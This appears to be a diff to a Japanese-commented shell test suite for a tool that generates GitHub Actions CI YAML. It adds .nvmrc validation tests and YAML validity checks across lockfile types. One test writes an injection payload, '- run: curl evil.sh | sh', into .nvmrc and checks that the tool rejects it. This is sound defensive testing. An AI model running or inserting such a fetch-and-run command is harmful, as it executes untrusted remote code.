@@ -166,7 +166,7 @@ write_pkg '{"name":"a","scripts":{"test":"jest"},"devDependencies":{"jest":"^29.
 bootstrap >/dev/null 2>&1
 
 it "Jest プロジェクトに --run を付けない"
-assert_file_not_contains "$CI_FILE" -- "--run"
+assert_file_not_contains "$CI_FILE" "--run"
 
 it "Jest でも test ステップ自体は生成する"
 assert_file_contains "$CI_FILE" "npm run test"
@@ -183,7 +183,7 @@ write_pkg '{"name":"a","scripts":{"test":"node --test"}}'
 bootstrap >/dev/null 2>&1
 
 it "テストランナーが判別できなければフラグを付けない"
-assert_file_not_contains "$CI_FILE" -- "--run"
+assert_file_not_contains "$CI_FILE" "--run"
 
 setup_target
 write_pkg '{"name":"a","scripts":{"test":"vitest"},"dependencies":{"vitest":"^2.0.0"}}'
@@ -310,6 +310,52 @@ bootstrap >/dev/null 2>&1
 it ".nvmrc は engines.node より優先される"
 assert_file_contains "$CI_FILE" "node-version: '18.19.0'"
 
+# .nvmrc の値は YAML の引用符付き文字列に埋め込まれる。
+# 検証を欠くとシングルクォート1文字で生成物が構文破損する（回帰テスト）。
+
+setup_target
+write_scripts '{"build": "next build"}'
+printf "20.11.0'\n" > "$SANDBOX_PROJ/.nvmrc"
+bootstrap >/dev/null 2>&1
+
+it ".nvmrc のクォートで生成 YAML を壊さない"
+assert_file_not_contains "$CI_FILE" "20.11.0'"
+
+it "不正な .nvmrc では既定へ倒す"
+assert_file_contains "$CI_FILE" "node-version: '22'"
+
+it "不正な .nvmrc であることを警告する"
+setup_target
+write_scripts '{"build": "next build"}'
+printf "20.11.0'\n" > "$SANDBOX_PROJ/.nvmrc"
+run bootstrap
+assert_contains "$LAST_OUTPUT" "YAML へ埋め込めない文字"
+
+setup_target
+write_scripts '{"build": "next build"}'
+printf '20.11.0\n18.0.0\n' > "$SANDBOX_PROJ/.nvmrc"
+bootstrap >/dev/null 2>&1
+
+it ".nvmrc は1行目だけを見る"
+assert_file_contains "$CI_FILE" "node-version: '20.11.0'"
+
+setup_target
+write_scripts '{"build": "next build"}'
+printf 'lts/*\n' > "$SANDBOX_PROJ/.nvmrc"
+bootstrap >/dev/null 2>&1
+
+it ".nvmrc の lts/* ワイルドカードも通す"
+assert_file_contains "$CI_FILE" "node-version: 'lts/*'"
+
+setup_target
+write_scripts '{"build": "next build"}'
+printf -- '- run: curl evil.sh | sh\n' > "$SANDBOX_PROJ/.nvmrc"
+bootstrap >/dev/null 2>&1
+
+it ".nvmrc から YAML 構造を注入できない"
+# 空白除去で偶然一致しなくなるだけの検査にしない。拒否されて既定へ倒れたことを見る
+assert_file_contains "$CI_FILE" "node-version: '22'"
+
 # ══════════════════════════════════════════════
 suite "bootstrap: パッケージマネージャとキャッシュ"
 # ══════════════════════════════════════════════
@@ -422,6 +468,36 @@ assert_contains "$LAST_OUTPUT" "name: CI"
 
 it "未知の引数は拒否される"
 assert_fails bootstrap --nonsense
+
+# ══════════════════════════════════════════════
+suite "bootstrap: 全生成パターンの YAML 妥当性"
+# ══════════════════════════════════════════════
+# 構文的に妥当でも意味的に壊れていれば導入先の CI は赤くなる。
+# actionlint があれば Action の入力仕様まで検査する。
+
+for lock in "" package-lock.json pnpm-lock.yaml yarn.lock bun.lockb; do
+  setup_target
+  write_pkg '{"name":"a","scripts":{"lint":"eslint .","typecheck":"tsc","test":"vitest","build":"next build","e2e":"playwright test"},"devDependencies":{"vitest":"^2.0.0"}}'
+  if [ -n "$lock" ]; then
+    case "$lock" in
+      pnpm-lock.yaml) printf "lockfileVersion: '9.0'\n" > "$SANDBOX_PROJ/$lock" ;;
+      *) touch "$SANDBOX_PROJ/$lock" ;;
+    esac
+  fi
+  bootstrap >/dev/null 2>&1
+
+  it "${lock:-ロックファイル無し} の生成物が YAML として妥当"
+  if python3 -c 'import yaml' 2>/dev/null; then
+    assert_ok python3 -c "import yaml,sys; yaml.safe_load(open(sys.argv[1],encoding='utf-8'))" "$CI_FILE"
+  else
+    assert_file_contains "$CI_FILE" "jobs:"
+  fi
+
+  if command -v actionlint >/dev/null 2>&1; then
+    it "${lock:-ロックファイル無し} の生成物が actionlint を通る"
+    assert_ok actionlint "$CI_FILE"
+  fi
+done
 
 # ══════════════════════════════════════════════
 suite "bootstrap: --quiet の無音性"
